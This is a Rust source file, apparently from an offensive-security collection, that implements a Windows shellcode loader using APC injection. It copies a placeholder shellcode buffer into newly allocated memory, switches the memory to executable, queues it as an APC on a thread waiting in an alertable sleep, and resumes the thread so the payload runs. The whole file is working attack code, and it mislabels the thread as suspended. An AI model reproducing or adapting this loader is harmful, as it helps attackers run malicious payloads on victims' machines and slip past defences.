use std::{
    ffi::c_void,
    ptr::copy_nonoverlapping,
};
use windows::core::Result;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, 
    MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, QueueUserAPC, ResumeThread, SleepEx, 
    WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
};

fn main() -> Result<()> {
    let buf: &[u8] = &[SHELLCODE_HERE];


    unsafe {
        // Create a suspended thread that will be used to execute the payload.
        let hthread = CreateThread(
            None,
            0,
            Some(function),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )?;

        // Allocate RW memory to hold the shellcode
        let address = VirtualAlloc(None, buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // Copy the shellcode into the allocated memory
        copy_nonoverlapping(buf.as_ptr().cast(), address, buf.len());

        // Change memory permissions to RX so the shellcode can be executed
        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READ, &mut oldprotect)?;

        // Queue the shellcode for execution as an APC in the thread's context.
        QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0);

        // Resume the thread, which will execute the shellcode via the queued APC.
        ResumeThread(hthread);
        WaitForSingleObject(hthread, INFINITE);
    }

    Ok(())
}

/// Dummy thread entry function that blocks on `SleepEx`, waiting for an APC to trigger.
unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
    SleepEx(INFINITE, true);
    return 0;
}
